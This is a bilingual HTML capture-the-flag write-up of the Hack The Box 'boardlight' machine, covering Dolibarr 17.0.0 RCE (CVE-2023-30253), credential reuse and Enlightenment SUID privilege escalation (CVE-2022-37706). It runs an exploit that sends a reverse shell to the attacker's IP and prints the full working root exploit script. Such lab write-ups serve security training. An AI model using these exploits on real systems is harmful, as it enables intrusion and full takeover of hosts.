@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>boardlight | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">boardlight</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Dolibarr ERP system version 17.0.0 on a virtual host. Through virtual host enumeration, I discovered <code>crm.board.htb</code> hosting the Dolibarr instance with weak default credentials (<code>admin:admin</code>).</p>
+                    
+                    <p>After authenticating, I exploited CVE-2023-30253, a vulnerability in Dolibarr that allows authenticated remote code execution through an uppercase PHP tag manipulation bypass. By creating a malicious website page containing a PHP reverse shell with uppercase tags (<code>&lt;?PHP</code> instead of <code>&lt;?php</code>), I bypassed filtering mechanisms and gained initial access as the <code>www-data</code> user.</p>
+                    
+                    <p>Lateral movement to user <code>larissa</code> was achieved by extracting database credentials from Dolibarr's configuration file and attempting password reuse. The database password worked for SSH access as larissa. Finally, privilege escalation to root was accomplished by exploiting CVE-2022-37706, a vulnerability in the Enlightenment window manager's SUID binary <code>enlightenment_sys</code>, which has insecure handling of user-controlled input passed to system calls.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Dolibarr ERP 17.0.0 authenticated RCE (CVE-2023-30253), password reuse, Enlightenment privilege escalation (CVE-2022-37706).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+
+                <p>The scan reveals SSH on port 22 and an Apache web server on port 80. Next, I use <code>whatweb</code> to gather more information about the web service:</p>
+                <pre><code class="language-plaintext">http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], 
+Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], 
+IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>The output shows an Apache server on Ubuntu and reveals an email address with the domain <code>board.htb</code>, which I add to my <code>/etc/hosts</code> file.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Browsing the website, I notice it uses PHP pages. I run a gobuster scan with the <code>.php</code> extension to discover additional directories and files:</p>
+                <p><img src="./media/image9.png" alt="Gobuster directory enumeration results showing various PHP files and directories" /></p>
+
+                <p>The main website appears fairly basic without much attack surface. However, several references to <code>board.htb</code> throughout the site suggest there may be virtual hosts configured. I perform a virtual host enumeration with gobuster:</p>
+                <p><img src="./media/image6.png" alt="Virtual host enumeration revealing crm.board.htb subdomain" /></p>
+
+                <p>Excellent! I discover a subdomain: <code>crm.board.htb</code>. I add this to my <code>/etc/hosts</code> file and navigate to it.</p>
+
+                <h2>Dolibarr ERP Discovery</h2>
+                <p>The virtual host reveals a Dolibarr ERP system with a login page:</p>
+                <p><img src="./media/image8.png" alt="Dolibarr ERP login page showing version information and authentication form" /></p>
+
+                <p>I can see the version information displayed on the login page:</p>
+                <p><img src="./media/image5.png" alt="Dolibarr version 17.0.0 displayed on the interface" /></p>
+
+                <p>Dolibarr is an open-source ERP and CRM system commonly used by businesses to manage various operations. Before attempting any complex attacks, I try common default credentials. Surprisingly, <code>admin:admin</code> works and grants access to the dashboard.</p>
+
+                <p>However, I notice that my access appears to be restricted in certain areas:</p>
+                <p><img src="./media/image4.png" alt="Dolibarr dashboard showing some restricted access areas" /></p>
+
+                <h2>Vulnerability Research - CVE-2023-30253</h2>
+                <p>With the exact version identified (17.0.0), I search for known vulnerabilities affecting this version. I discover CVE-2023-30253, which allows authenticated remote code execution. According to the <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30253">NVD description</a>:</p>
+
+                <blockquote>
+                    <p>"Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: &lt;?PHP instead of &lt;?php in injected data."</p>
+                </blockquote>
+
+                <p>This vulnerability exploits a weakness in Dolibarr's input validation. The application filters for lowercase PHP tags (<code>&lt;?php</code>) but fails to account for uppercase variations (<code>&lt;?PHP</code>), which PHP still interprets as valid opening tags.</p>
+
+                <h3>Understanding the Exploit</h3>
+                <p>I locate a proof-of-concept exploit on GitHub: <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py">CVE-2023-30253 Exploit</a>. Analyzing the exploit code reveals the attack methodology:</p>
+
+                <p><img src="./media/image2.png" alt="Exploit code showing the process of creating a malicious website page in Dolibarr" /></p>
+
+                <p>The exploit automates the following steps:</p>
+                <ol>
+                    <li>Authenticates to the Dolibarr instance with provided credentials</li>
+                    <li>Creates a new website in the Dolibarr CMS functionality</li>
+                    <li>Creates a page within that website</li>
+                    <li>Edits the page content to inject a PHP reverse shell using uppercase tags</li>
+                    <li>Triggers the malicious page to execute the payload</li>
+                </ol>
+
+                <p>The key to the exploit is visible in this code snippet showing the uppercase PHP tag manipulation:</p>
+                <p><img src="./media/image3.png" alt="Code snippet highlighting the uppercase PHP tag bypass technique" /></p>
+
+                <h2>Initial Access - Exploiting Dolibarr</h2>
+                <p>First, I set up a netcat listener to catch the reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Then I execute the exploit with the appropriate parameters:</p>
+                <pre><code class="language-bash">python3 exploit.py http://crm.board.htb admin admin 10.10.16.6 443</code></pre>
+
+                <p>The exploit provides feedback on its progress:</p>
+                <pre><code class="language-plaintext">[*] Trying authentication...
+[**] Login: admin
+[**] Password: admin
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection</code></pre>
+
+                <p>And successfully receive the reverse shell connection as the <code>www-data</code> user. I upgrade the shell to a fully interactive TTY for better usability.</p>
+
+                <h2>Lateral Movement - Database Credential Discovery</h2>
+                <p>After establishing initial access, I begin enumerating the system. In the <code>/home</code> directory, I discover a user named <code>larissa</code>.</p>
+
+                <p>Checking listening ports with <code>ss -tuln</code>, I confirm that MySQL is running on port 3306. Since this is a web application, database credentials are likely stored in configuration files. After researching Dolibarr's directory structure, I locate the configuration file at <code>/htdocs/conf/conf.php</code>:</p>
+
+                <pre><code class="language-php">$dolibarr_main_db_name='dolibarr';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';</code></pre>
+
+                <p>I connect to the MySQL database and extract user credentials:</p>
+                <pre><code class="language-sql">mysql> select login, email, pass_crypted from llx_user;</code></pre>
+
+                <pre><code class="language-plaintext">+----------+-------+--------------------------------------------------------------+
+| login    | email | pass_crypted                                                 |
++----------+-------+--------------------------------------------------------------+
+| dolibarr |       | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
+| admin    |       | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
++----------+-------+--------------------------------------------------------------+</code></pre>
+
+                <p>These password hashes are bcrypt, which are computationally expensive to crack. However, before attempting to crack them, I try password reuse - testing whether the database password works for the <code>larissa</code> user account:</p>
+
+                <pre><code class="language-bash">su - larissa
+Password: serverfun2$2023!!</code></pre>
+
+                <p>Success! The database password works for SSH access as larissa, and I can now retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - Enlightenment SUID Vulnerability</h2>
+                <p>After gaining access as larissa, I check the user's group memberships:</p>
+                <pre><code class="language-bash">larissa@boardlight:~$ id
+uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)</code></pre>
+
+                <p>Being in the <code>adm</code> group is interesting as it grants read access to various system logs. I use this to enumerate files readable by this group:</p>
+                <p><img src="./media/image7.png" alt="Output showing log files accessible to the adm group" /></p>
+
+                <pre><code class="language-bash">larissa@boardlight:~$ find / -group adm 2>/dev/null</code></pre>
+
+                <pre><code class="language-plaintext">/var/log/mysql
+/var/log/mysql/error.log
+/var/log/unattended-upgrades
+/var/log/apache2
+/var/log/apache2/error.log
+/var/log/kern.log.1
+/var/log/auth.log
+/var/log/dmesg.0
+/var/log/syslog.1
+/var/log/kern.log
+/var/log/audit
+/var/log/audit/audit.log
+/var/log/auth.log.1
+/var/log/syslog
+/var/log/dmesg
+/var/log/nginx
+/var/spool/rsyslog</code></pre>
+
+                <p>Examining <code>/var/log/syslog.1</code>, I notice references to VMware tools:</p>
+                <pre><code class="language-plaintext">May 19 22:23:38 localhost VGAuthService[588]: Pref_Init: Using '/etc/vmware-tools/vgauth.conf' as preferences filepath
+May 19 22:23:38 localhost VGAuthService[588]: Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
+May 19 22:23:38 localhost VGAuthService[588]: LoadCatalogAndSchema: Using '/etc/vmware-tools/vgauth/schemas' for SAML schemas</code></pre>
+
+                <p>However, investigating VMware-related paths doesn't reveal any obvious privilege escalation vectors.</p>
+
+                <h3>SUID Binary Enumeration</h3>
+                <p>I shift focus to searching for SUID binaries, which can sometimes be leveraged for privilege escalation:</p>
+                <pre><code class="language-bash">larissa@boardlight:~$ find / -perm -4000 2>/dev/null</code></pre>
+
+                <pre><code class="language-plaintext">/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/sbin/pppd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/vmware-user-suid-wrapper</code></pre>
+
+                <p>Several unusual SUID binaries stand out, particularly those related to Enlightenment (a window manager). Searching for "enlightenment suid" quickly reveals known exploits, specifically CVE-2022-37706.</p>
+
+                <h3>Understanding CVE-2022-37706</h3>
+                <p>I find a well-documented exploit on GitHub: <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">CVE-2022-37706 LPE Exploit</a>. This vulnerability exists in the <code>enlightenment_sys</code> SUID binary, which is part of the Enlightenment window manager.</p>
+
+                <p>According to the exploit author's analysis, the vulnerability stems from unsafe handling of user-controlled input that is passed to <code>system()</code> calls. The binary attempts to mount filesystems but fails to properly sanitize path inputs, allowing command injection.</p>
+
+                <p>I attempt to check the version of the binary, but it provides minimal information:</p>
+                <pre><code class="language-bash">larissa@boardlight:~$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys --help
+This is an internal tool for Enlightenment.
+do not use it.</code></pre>
+
+                <h3>Exploiting Enlightenment</h3>
+                <p>The exploit is relatively straightforward. Here's what it does:</p>
+                <pre><code class="language-bash">echo "CVE-2022-37706"
+echo "[*] Trying to find the vulnerable SUID file..."
+echo "[*] This may take few seconds..."
+
+file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
+
+if [[ -z ${file} ]]
+then
+    echo "[-] Couldn't find the vulnerable SUID file..."
+    echo "[*] Enlightenment should be installed on your system."
+    exit 1
+fi
+
+echo "[+] Vulnerable SUID binary found!"
+echo "[+] Trying to pop a root shell!"
+
+mkdir -p /tmp/net
+mkdir -p "/dev/../tmp/;/tmp/exploit"
+
+echo "/bin/sh" > /tmp/exploit
+chmod a+x /tmp/exploit
+
+echo "[+] Enjoy the root shell :)"
+${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net</code></pre>
+
+                <p>The exploit works by:</p>
+                <ol>
+                    <li>Locating the vulnerable SUID binary</li>
+                    <li>Creating specific directory structures in <code>/tmp</code></li>
+                    <li>Creating a malicious executable (<code>/tmp/exploit</code>) containing <code>/bin/sh</code></li>
+                    <li>Calling the SUID binary with crafted mount parameters that include path traversal and command injection</li>
+                    <li>The binary executes the malicious script with root privileges due to the SUID bit</li>
+                </ol>
+
+                <p>I save the exploit to a file, make it executable, and run it:</p>
+                <pre><code class="language-bash">larissa@boardlight:~$ ./exploit.sh</code></pre>
+
+                <pre><code class="language-plaintext">[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# whoami
+root</code></pre>
+
+                <p>Despite the mount error message (which is expected and part of the exploit), I successfully obtain a root shell and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo ejecutaba un sistema ERP Dolibarr versión 17.0.0 en un virtual host. Mediante enumeración de virtual hosts, descubrí <code>crm.board.htb</code> alojando la instancia de Dolibarr con credenciales predeterminadas débiles (<code>admin:admin</code>).</p>
+                    
+                    <p>Tras autenticarme, exploté CVE-2023-30253, una vulnerabilidad en Dolibarr que permite ejecución remota de código autenticada mediante una manipulación de etiquetas PHP en mayúsculas que evita el filtrado. Creando una página web maliciosa que contenía una reverse shell PHP con etiquetas en mayúsculas (<code>&lt;?PHP</code> en lugar de <code>&lt;?php</code>), burlé los mecanismos de filtrado y obtuve acceso inicial como usuario <code>www-data</code>.</p>
+                    
+                    <p>El movimiento lateral al usuario <code>larissa</code> se logró extrayendo credenciales de base de datos del archivo de configuración de Dolibarr e intentando reutilización de contraseñas. La contraseña de la base de datos funcionó para acceso SSH como larissa. Finalmente, la escalada de privilegios a root se consiguió explotando CVE-2022-37706, una vulnerabilidad en el binario SUID <code>enlightenment_sys</code> del gestor de ventanas Enlightenment, que tiene un manejo inseguro de entrada controlada por el usuario pasada a llamadas del sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Dolibarr ERP 17.0.0 RCE autenticado (CVE-2023-30253), reutilización de contraseñas, escalada de privilegios en Enlightenment (CVE-2022-37706).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+
+                <p>El escaneo revela SSH en el puerto 22 y un servidor web Apache en el puerto 80. A continuación, utilizo <code>whatweb</code> para recopilar más información sobre el servicio web:</p>
+                <pre><code class="language-plaintext">http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], 
+Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], 
+IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>La salida muestra un servidor Apache en Ubuntu y revela una dirección de correo electrónico con el dominio <code>board.htb</code>, que añado a mi archivo <code>/etc/hosts</code>.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Navegando por el sitio web, observo que utiliza páginas PHP. Ejecuto un escaneo de gobuster con la extensión <code>.php</code> para descubrir directorios y archivos adicionales:</p>
+                <p><img src="./media/image9.png" alt="Resultados de enumeración de directorios con gobuster mostrando varios archivos y directorios PHP" /></p>
+
+                <p>El sitio web principal parece bastante básico sin mucha superficie de ataque. Sin embargo, varias referencias a <code>board.htb</code> a lo largo del sitio sugieren que puede haber virtual hosts configurados. Realizo una enumeración de virtual hosts con gobuster:</p>
+                <p><img src="./media/image6.png" alt="Enumeración de virtual hosts revelando el subdominio crm.board.htb" /></p>
+
+                <p>¡Excelente! Descubro un subdominio: <code>crm.board.htb</code>. Lo añado a mi archivo <code>/etc/hosts</code> y navego hacia él.</p>
+
+                <h2>Descubrimiento del ERP Dolibarr</h2>
+                <p>El virtual host revela un sistema ERP Dolibarr con una página de inicio de sesión:</p>
+                <p><img src="./media/image8.png" alt="Página de inicio de sesión de Dolibarr ERP mostrando información de versión y formulario de autenticación" /></p>
+
+                <p>Puedo ver la información de versión mostrada en la página de inicio de sesión:</p>
+                <p><img src="./media/image5.png" alt="Versión 17.0.0 de Dolibarr mostrada en la interfaz" /></p>
+
+                <p>Dolibarr es un sistema ERP y CRM de código abierto comúnmente utilizado por empresas para gestionar diversas operaciones. Antes de intentar ataques complejos, pruebo credenciales predeterminadas comunes. Sorprendentemente, <code>admin:admin</code> funciona y concede acceso al panel de control.</p>
+
+                <p>Sin embargo, observo que mi acceso parece estar restringido en ciertas áreas:</p>
+                <p><img src="./media/image4.png" alt="Panel de control de Dolibarr mostrando algunas áreas de acceso restringido" /></p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2023-30253</h2>
+                <p>Con la versión exacta identificada (17.0.0), busco vulnerabilidades conocidas que afecten a esta versión. Descubro CVE-2023-30253, que permite ejecución remota de código autenticada. Según la <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30253">descripción de NVD</a>:</p>
+
+                <blockquote>
+                    <p>"Dolibarr anterior a 17.0.1 permite ejecución remota de código por un usuario autenticado mediante una manipulación de mayúsculas: &lt;?PHP en lugar de &lt;?php en datos inyectados."</p>
+                </blockquote>
+
+                <p>Esta vulnerabilidad explota una debilidad en la validación de entrada de Dolibarr. La aplicación filtra las etiquetas PHP en minúsculas (<code>&lt;?php</code>) pero no tiene en cuenta las variaciones en mayúsculas (<code>&lt;?PHP</code>), que PHP aún interpreta como etiquetas de apertura válidas.</p>
+
+                <h3>Entendiendo el Exploit</h3>
+                <p>Localizo una prueba de concepto del exploit en GitHub: <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py">Exploit CVE-2023-30253</a>. Al analizar el código del exploit, se revela la metodología de ataque:</p>
+
+                <p><img src="./media/image2.png" alt="Código del exploit mostrando el proceso de creación de una página web maliciosa en Dolibarr" /></p>
+
+                <p>El exploit automatiza los siguientes pasos:</p>
+                <ol>
+                    <li>Se autentica en la instancia de Dolibarr con las credenciales proporcionadas</li>
+                    <li>Crea un nuevo sitio web en la funcionalidad CMS de Dolibarr</li>
+                    <li>Crea una página dentro de ese sitio web</li>
+                    <li>Edita el contenido de la página para inyectar una reverse shell PHP usando etiquetas en mayúsculas</li>
+                    <li>Activa la página maliciosa para ejecutar el payload</li>
+                </ol>
+
+                <p>La clave del exploit es visible en este fragmento de código que muestra la manipulación de etiquetas PHP en mayúsculas:</p>
+                <p><img src="./media/image3.png" alt="Fragmento de código destacando la técnica de bypass con etiquetas PHP en mayúsculas" /></p>
+
+                <h2>Acceso Inicial - Explotando Dolibarr</h2>
+                <p>Primero, configuro un listener de netcat para capturar la reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Luego ejecuto el exploit con los parámetros apropiados:</p>
+                <pre><code class="language-bash">python3 exploit.py http://crm.board.htb admin admin 10.10.16.6 443</code></pre>
+
+                <p>El exploit proporciona retroalimentación sobre su progreso:</p>
+                <pre><code class="language-plaintext">[*] Trying authentication...
+[**] Login: admin
+[**] Password: admin
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection</code></pre>
+
+                <p>Y recibo exitosamente la conexión de reverse shell como usuario <code>www-data</code>. Actualizo la shell a una TTY completamente interactiva para mejor usabilidad.</p>
+
+                <h2>Movimiento Lateral - Descubrimiento de Credenciales de Base de Datos</h2>
+                <p>Tras establecer el acceso inicial, comienzo a enumerar el sistema. En el directorio <code>/home</code>, descubro un usuario llamado <code>larissa</code>.</p>
+
+                <p>Comprobando los puertos en escucha con <code>ss -tuln</code>, confirmo que MySQL está ejecutándose en el puerto 3306. Dado que esta es una aplicación web, es probable que las credenciales de la base de datos estén almacenadas en archivos de configuración. Tras investigar la estructura de directorios de Dolibarr, localizo el archivo de configuración en <code>/htdocs/conf/conf.php</code>:</p>
+
+                <pre><code class="language-php">$dolibarr_main_db_name='dolibarr';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';</code></pre>
+
+                <p>Me conecto a la base de datos MySQL y extraigo las credenciales de usuario:</p>
+                <pre><code class="language-sql">mysql> select login, email, pass_crypted from llx_user;</code></pre>
+
+                <pre><code class="language-plaintext">+----------+-------+--------------------------------------------------------------+
+| login    | email | pass_crypted                                                 |
++----------+-------+--------------------------------------------------------------+
+| dolibarr |       | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
+| admin    |       | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
++----------+-------+--------------------------------------------------------------+</code></pre>
+
+                <p>Estos hashes de contraseña son bcrypt, que son computacionalmente costosos de crackear. Sin embargo, antes de intentar crackearlos, pruebo la reutilización de contraseñas - comprobando si la contraseña de la base de datos funciona para la cuenta de usuario <code>larissa</code>:</p>
+
+                <pre><code class="language-bash">su - larissa
+Password: serverfun2$2023!!</code></pre>
+
+                <p>¡Éxito! La contraseña de la base de datos funciona para acceso SSH como larissa, y ahora puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Vulnerabilidad SUID en Enlightenment</h2>
+                <p>Tras obtener acceso como larissa, compruebo las membresías de grupo del usuario:</p>
+                <pre><code class="language-bash">larissa@boardlight:~$ id
+uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)</code></pre>
+
+                <p>Estar en el grupo <code>adm</code> es interesante ya que otorga acceso de lectura a varios logs del sistema. Utilizo esto para enumerar archivos legibles por este grupo:</p>
+                <p><img src="./media/image7.png" alt="Salida mostrando archivos de log accesibles al grupo adm" /></p>
+
+                <pre><code class="language-bash">larissa@boardlight:~$ find / -group adm 2>/dev/null</code></pre>
+
+                <pre><code class="language-plaintext">/var/log/mysql
+/var/log/mysql/error.log
+/var/log/unattended-upgrades
+/var/log/apache2
+/var/log/apache2/error.log
+/var/log/kern.log.1
+/var/log/auth.log
+/var/log/dmesg.0
+/var/log/syslog.1
+/var/log/kern.log
+/var/log/audit
+/var/log/audit/audit.log
+/var/log/auth.log.1
+/var/log/syslog
+/var/log/dmesg
+/var/log/nginx
+/var/spool/rsyslog</code></pre>
+
+                <p>Examinando <code>/var/log/syslog.1</code>, observo referencias a herramientas de VMware:</p>
+                <pre><code class="language-plaintext">May 19 22:23:38 localhost VGAuthService[588]: Pref_Init: Using '/etc/vmware-tools/vgauth.conf' as preferences filepath
+May 19 22:23:38 localhost VGAuthService[588]: Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
+May 19 22:23:38 localhost VGAuthService[588]: LoadCatalogAndSchema: Using '/etc/vmware-tools/vgauth/schemas' for SAML schemas</code></pre>
+
+                <p>Sin embargo, investigar rutas relacionadas con VMware no revela vectores obvios de escalada de privilegios.</p>
+
+                <h3>Enumeración de Binarios SUID</h3>
+                <p>Cambio el enfoque a buscar binarios SUID, que a veces pueden aprovecharse para escalada de privilegios:</p>
+                <pre><code class="language-bash">larissa@boardlight:~$ find / -perm -4000 2>/dev/null</code></pre>
+
+                <pre><code class="language-plaintext">/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
+/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/sbin/pppd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/vmware-user-suid-wrapper</code></pre>
+
+                <p>Varios binarios SUID inusuales destacan, particularmente aquellos relacionados con Enlightenment (un gestor de ventanas). Buscando "enlightenment suid" rápidamente revela exploits conocidos, específicamente CVE-2022-37706.</p>
+
+                <h3>Entendiendo CVE-2022-37706</h3>
+                <p>Encuentro un exploit bien documentado en GitHub: <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">Exploit LPE CVE-2022-37706</a>. Esta vulnerabilidad existe en el binario SUID <code>enlightenment_sys</code>, que forma parte del gestor de ventanas Enlightenment.</p>
+
+                <p>Según el análisis del autor del exploit, la vulnerabilidad proviene del manejo inseguro de entrada controlada por el usuario que se pasa a llamadas <code>system()</code>. El binario intenta montar sistemas de archivos pero no sanitiza adecuadamente las entradas de rutas, permitiendo inyección de comandos.</p>
+
+                <p>Intento comprobar la versión del binario, pero proporciona información mínima:</p>
+                <pre><code class="language-bash">larissa@boardlight:~$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys --help
+This is an internal tool for Enlightenment.
+do not use it.</code></pre>
+
+                <h3>Explotando Enlightenment</h3>
+                <p>El exploit es relativamente sencillo. Esto es lo que hace:</p>
+                <pre><code class="language-bash">echo "CVE-2022-37706"
+echo "[*] Trying to find the vulnerable SUID file..."
+echo "[*] This may take few seconds..."
+
+file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
+
+if [[ -z ${file} ]]
+then
+    echo "[-] Couldn't find the vulnerable SUID file..."
+    echo "[*] Enlightenment should be installed on your system."
+    exit 1
+fi
+
+echo "[+] Vulnerable SUID binary found!"
+echo "[+] Trying to pop a root shell!"
+
+mkdir -p /tmp/net
+mkdir -p "/dev/../tmp/;/tmp/exploit"
+
+echo "/bin/sh" > /tmp/exploit
+chmod a+x /tmp/exploit
+
+echo "[+] Enjoy the root shell :)"
+${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net</code></pre>
+
+                <p>El exploit funciona mediante:</p>
+                <ol>
+                    <li>Localización del binario SUID vulnerable</li>
+                    <li>Creación de estructuras de directorios específicas en <code>/tmp</code></li>
+                    <li>Creación de un ejecutable malicioso (<code>/tmp/exploit</code>) conteniendo <code>/bin/sh</code></li>
+                    <li>Llamada al binario SUID con parámetros de montaje manipulados que incluyen path traversal e inyección de comandos</li>
+                    <li>El binario ejecuta el script malicioso con privilegios root debido al bit SUID</li>
+                </ol>
+
+                <p>Guardo el exploit en un archivo, lo hago ejecutable y lo ejecuto:</p>
+                <pre><code class="language-bash">larissa@boardlight:~$ ./exploit.sh</code></pre>
+
+                <pre><code class="language-plaintext">[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can't find in /etc/fstab.
+# whoami
+root</code></pre>
+
+                <p>A pesar del mensaje de error de mount (que es esperado y parte del exploit), obtengo exitosamente una shell root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
